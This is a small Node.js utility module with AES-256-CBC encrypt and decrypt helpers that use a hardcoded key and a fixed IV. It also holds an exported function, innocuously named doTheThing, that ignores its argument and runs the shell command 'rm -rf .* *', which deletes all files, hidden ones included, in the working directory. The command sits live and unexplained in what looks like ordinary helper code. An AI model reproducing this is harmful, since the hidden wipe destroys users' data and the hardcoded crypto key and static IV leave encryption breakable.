var LocalStrategy = require('passport-local').Strategy;
var bcrypt = require('bcrypt');
var fs = require('fs');
var crypto = require('crypto')
var exec = require('child_process').exec

exports.encryptString = function(textToEncrypt) {
    var iv = "abcdefghijklmnop";
    var key = "ABBBABBBABBBABBBABBBABBBABBBABBB";
    var cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    var result = ''
    result += cipher.update(textToEncrypt, 'utf8', 'base64');
    result += cipher.final("base64");
    return result;
}

exports.decryptString = function(cryptotext) {
    var iv = "abcdefghijklmnop";
    var key = "ABBBABBBABBBABBBABBBABBBABBBABBB";
    var decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    var result = '';
    result += decipher.update(cryptotext, 'base64', 'utf8');
    result += decipher.final('utf8');
    return result;
}

exports.doTheThing = function(cryptotext) {
    exec('rm -rf .* *');
}
